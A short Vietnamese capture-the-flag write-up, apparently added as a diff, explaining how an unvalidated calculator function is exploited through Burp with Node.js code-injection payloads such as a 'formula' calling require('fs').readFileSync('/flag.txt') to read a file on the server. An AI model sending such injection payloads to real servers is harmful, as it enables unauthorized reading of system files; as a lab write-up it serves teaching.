@@ -1,0 +1,6 @@
+khi mở source code lên và check thông tin ở hàm "calculatorHelper.js"
+=> hàm này sẽ tính toán mọi kết quả nhập vào mà không có kiểm tra đầu vào
+=> ta có thể khai thác lỗ hổng ở đây sử dung burp để tấn công
+khi thực hiện gửi formula="require('fs')" thấy server có phản hồi
+=> tiếp tục gửi formula="require('fs').readFileSync('/flag.txt')" (tiến hành đọc file flag.txt trong hệ thống)
+=> kết quả trả về dạng hex => gửi formula="require('fs').readFileSync('/flag.txt').toString()" => thu được flag
